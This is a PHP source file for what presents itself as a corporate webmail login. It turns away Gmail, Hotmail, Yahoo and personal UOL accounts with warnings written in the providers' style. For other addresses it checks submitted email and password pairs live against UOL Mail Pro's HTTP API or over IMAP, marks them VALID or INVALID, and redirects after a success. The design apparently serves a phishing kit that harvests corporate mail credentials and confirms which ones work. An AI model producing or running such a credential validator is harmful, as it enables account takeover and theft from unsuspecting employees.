<?php
declare(strict_types=1);

require_once __DIR__ . '/webmail_login_validate.php';
require_once __DIR__ . '/uol_mailpro_http.php';
require_once __DIR__ . '/imap_verify.php';
require_once __DIR__ . '/webmail_redirect.php';

/** Detecta provedor gratuito/pessoal pelo domínio do e-mail. */
function webmail_free_provider_key(string $email): ?string
{
    $domain = webmail_email_domain($email);
    if ($domain === '') {
        return null;
    }

    $map = [
        'gmail.com'       => 'gmail',
        'googlemail.com'  => 'gmail',
        'google.com'      => 'gmail',
        'hotmail.com'     => 'hotmail',
        'hotmail.com.br'  => 'hotmail',
        'live.com'        => 'hotmail',
        'outlook.com'     => 'outlook',
        'outlook.com.br'  => 'outlook',
        'msn.com'         => 'hotmail',
        'yahoo.com'       => 'yahoo',
        'yahoo.com.br'    => 'yahoo',
        'uol.com.br'      => 'uol_free',
        'bol.com.br'      => 'uol_free',
    ];

    if (isset($map[$domain])) {
        return $map[$domain];
    }

    foreach ($map as $blocked => $key) {
        if (str_ends_with($domain, '.' . $blocked)) {
            return $key;
        }
    }

    if (webmail_is_blocked_domain($domain)) {
        return 'personal';
    }

    return null;
}

/** Domínio usa UOL Mail Pro (MX uhserver / uolhost). */
function webmail_is_uol_mailpro_domain(string $email): bool
{
    $domain = webmail_email_domain($email);
    if ($domain === '') {
        return false;
    }

    $records = @dns_get_record($domain, DNS_MX);
    if (!is_array($records)) {
        return false;
    }

    foreach ($records as $record) {
        $target = strtolower(rtrim((string) ($record['target'] ?? ''), '.'));
        if ($target === '') {
            continue;
        }
        if (str_contains($target, 'uhserver.com')
            || str_contains($target, 'uhsever.com')
            || str_contains($target, 'uolhost')) {
            return true;
        }
    }

    return false;
}

/** Mensagens estilo aviso dos provedores (Gmail, Hotmail, UOL etc.). */
function webmail_provider_warning(string $providerKey, string $locale = 'pt_br'): array
{
    $messages = [
        'gmail' => [
            'message_key' => 'warn_gmail',
            'text_pt'     => 'Não foi possível entrar com Gmail neste webmail. Use o e-mail profissional da sua empresa (@seudominio.com.br), validado pelo UOL Mail Pro.',
            'text_en'     => 'Could not sign in with Gmail here. Use your company email (@yourdomain.com), validated via UOL Mail Pro.',
        ],
        'hotmail' => [
            'message_key' => 'warn_hotmail',
            'text_pt'     => 'Contas Hotmail/Outlook não são aceitas neste webmail corporativo. Informe o e-mail profissional do seu domínio.',
            'text_en'     => 'Hotmail/Outlook accounts are not accepted. Enter your professional domain email.',
        ],
        'outlook' => [
            'message_key' => 'warn_outlook',
            'text_pt'     => 'Contas Outlook não são aceitas neste webmail corporativo. Informe o e-mail profissional do seu domínio.',
            'text_en'     => 'Outlook accounts are not accepted. Enter your professional domain email.',
        ],
        'yahoo' => [
            'message_key' => 'warn_yahoo',
            'text_pt'     => 'E-mail Yahoo não é compatível. Use o endereço corporativo do seu domínio.',
            'text_en'     => 'Yahoo email is not compatible. Use your corporate domain address.',
        ],
        'uol_free' => [
            'message_key' => 'warn_uol_free',
            'text_pt'     => 'Para e-mail profissional UOL acesse https://mailpro.uol.com.br/ com usuário@seudominio.com.br — contas @uol.com.br/@bol.com.br não entram aqui.',
            'text_en'     => 'For UOL professional email use https://mailpro.uol.com.br/ with user@yourdomain.com — @uol.com.br/@bol.com.br accounts are not accepted here.',
        ],
        'personal' => [
            'message_key' => 'invalid_domain',
            'text_pt'     => 'Este e-mail não é compatível com o Webmail. Use apenas o domínio da sua empresa — Gmail, Hotmail, Outlook, Terra, UOL pessoal e e-mails gratuitos não são aceitos.',
            'text_en'     => 'This email is not compatible with Webmail. Use your company domain only.',
        ],
    ];

    $entry = $messages[$providerKey] ?? $messages['personal'];
    $text = ($locale === 'en') ? $entry['text_en'] : $entry['text_pt'];

    return [
        'ok'          => false,
        'message_key' => $entry['message_key'],
        'text'        => $text,
        'source'      => 'provider_warning',
        'provider'    => $providerKey,
    ];
}

/**
 * Valida credenciais: aviso para Gmail/Hotmail, API UOL Mail Pro para corporativo, IMAP opcional.
 *
 * @return array{
 *   ok:bool,
 *   message_key:string,
 *   text?:string,
 *   source:string,
 *   provider?:string,
 *   http_code?:int
 * }
 */
function webmail_verify_credentials_full(string $email, string $password, array $config, string $locale = 'pt_br'): array
{
    $email = trim($email);
    $password = (string) $password;

    if ($email === '') {
        return ['ok' => false, 'message_key' => 'no_username', 'source' => 'local'];
    }

    if ($password === '') {
        return ['ok' => false, 'message_key' => 'invalid_password', 'source' => 'local'];
    }

    $freeProvider = webmail_free_provider_key($email);
    if ($freeProvider !== null) {
        return webmail_provider_warning($freeProvider, $locale);
    }

    if (!webmail_is_valid_corporate_email($email)) {
        return ['ok' => false, 'message_key' => 'invalid_email', 'source' => 'local'];
    }

    if (webmail_password_is_weak($password, $email)) {
        return ['ok' => false, 'message_key' => 'invalid_password', 'source' => 'local'];
    }

    $useUolHttp = (array_key_exists('uol_mailpro_verify', $config)
        ? (bool) $config['uol_mailpro_verify']
        : true) && webmail_is_uol_mailpro_domain($email);

    if ($useUolHttp) {
        $http = uol_mailpro_http_verify_login($email, $password, $config);
        if ($http['ok']) {
            return $http;
        }

        $imapFallback = !empty($config['webmail_imap_fallback']);
        if (!$imapFallback) {
            return $http;
        }
    }

    $imapOk = mailbox_verify_login($email, $password);
    return [
        'ok'          => $imapOk,
        'message_key' => $imapOk ? 'success' : 'wrong_password',
        'source'      => 'imap',
    ];
}

/** Monta JSON de resposta do login público. */
function webmail_build_login_payload(array $check, array $config, string $locale, bool $includeRedirect = true): array
{
    $msgKey = (string) ($check['message_key'] ?? 'invalid_login');
    $text = (string) ($check['text'] ?? msg($msgKey, $locale));

    if ($check['ok']) {
        $redirect = $includeRedirect ? webmail_success_redirect($config) : null;
        $payload = [
            'ok'      => true,
            'message' => $msgKey,
            'text'    => msg('success', $locale),
            'level'   => 'success',
            'result'  => 'VALID',
            'source'  => $check['source'] ?? 'unknown',
        ];
        if ($redirect !== null && $redirect !== '') {
            $payload['redirect'] = $redirect;
        }
        return $payload;
    }

    $payload = [
        'ok'      => false,
        'message' => $msgKey,
        'text'    => $text,
        'level'   => str_starts_with($msgKey, 'warn_') ? 'warn' : 'error',
        'result'  => 'INVALID',
        'source'  => $check['source'] ?? 'unknown',
    ];

    if (!empty($check['provider'])) {
        $payload['provider'] = $check['provider'];
    }

    return $payload;
}
